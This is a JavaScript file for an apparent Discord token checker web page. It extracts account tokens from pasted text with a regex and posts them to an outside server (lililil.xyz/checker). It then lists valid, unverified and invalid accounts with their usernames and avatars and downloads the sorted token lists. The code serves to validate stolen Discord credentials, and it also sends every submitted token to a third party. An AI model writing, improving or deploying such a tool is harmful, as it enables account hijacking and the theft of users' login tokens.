function CheckTokens() {
    let input = document.getElementById("tokens").value
    let parsedTokens = [...new Set([...JSON.stringify(input)
        .matchAll(/(mfa\.[\w_\-]{84})|([\w]{24}\.[\w_\-]{6}\.[\w_\-]{27})/g)]
        .map(m => m.slice(1)).flat(Infinity)
        .filter(Boolean)
    )]

    if (parsedTokens.length === 0) {
        return alert("Tokens not found!")
    }

    document.getElementById("results").classList.remove("hide")
    document.getElementById("results").classList.add("results")
    document.getElementById("tokens_list").classList.remove("input_tokens")
    document.getElementById("tokens_list").classList.add("hide")

    let xhr = new XMLHttpRequest()
    xhr.open('POST', 'https://lililil.xyz/checker', true)
    xhr.setRequestHeader('Content-type', 'application/json')
    xhr.responseType = 'json'

    xhr.onload = function () {
        if (xhr.status !== 200) {
            document.getElementById("results").classList.add("hide")
            document.getElementById("results").classList.remove("results")
            document.getElementById("tokens_list").classList.add("input_tokens")
            document.getElementById("tokens_list").classList.remove("hide")
            return alert(xhr.response)
        }

        for (let token of Object.keys(xhr.response.tokensData)) {
            if (xhr.response.tokensData[token].status === "invalid") {
                document.getElementById("invalid_tokens").innerHTML +=
                    `<div class="account">
                        <div class="box">
                            <img src="./assets/Default.png" alt="User Avatar">
                        </div>
                        <div class="box">
                            <span>XXXXX#0000</span>
                            <p>${token}</p>
                        </div>
                    </div>`
            } else {
                let username = `${xhr.response.tokensData[token].me.username}#${xhr.response.tokensData[token].me.discriminator}`
                let id = xhr.response.tokensData[token].me.id
                let avatarId = xhr.response.tokensData[token].me.avatar
                let avatar = `https://cdn.discordapp.com/avatars/${id}/${xhr.response.tokensData[token].me.avatar}`
                if (avatarId === null) avatar = "./assets/Default.png"

                if (xhr.response.tokensData[token].status === "valid") {
                    document.getElementById("valid_tokens").innerHTML +=
                        `<div class="account">
                    <div class="box">
                        <img src="${avatar}" alt="User Avatar">
                    </div>
                    <div class="box">
                        <span>${username}</span>
                        <p>${token}</p>
                    </div>
                </div>`
                } else {
                    document.getElementById("unverified_tokens").innerHTML +=
                        `<div class="account">
                    <div class="box">
                        <img src="${avatar}" alt="User Avatar">
                    </div>
                    <div class="box">
                        <span>${username}</span>
                        <p>${token}</p>
                    </div>
                </div>`
                }
            }
        }
        for(let tokenType of Object.keys(xhr.response.tokensInfo)) {
            if(xhr.response.tokensInfo[tokenType].length === 0) continue
            download(tokenType, xhr.response.tokensInfo[tokenType].join("\n"))
        }
        download("json_output.json", JSON.stringify(xhr.response, null, "\t"))
    }
    xhr.send(JSON.stringify({parsedTokens}))
}

function download(filename, text) {
    let pom = document.createElement('a');
    pom.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
    pom.setAttribute('download', filename);

    if (document.createEvent) {
        let event = document.createEvent('MouseEvents');
        event.initEvent('click', true, true);
        pom.dispatchEvent(event);
    } else {
        pom.click();
    }
}
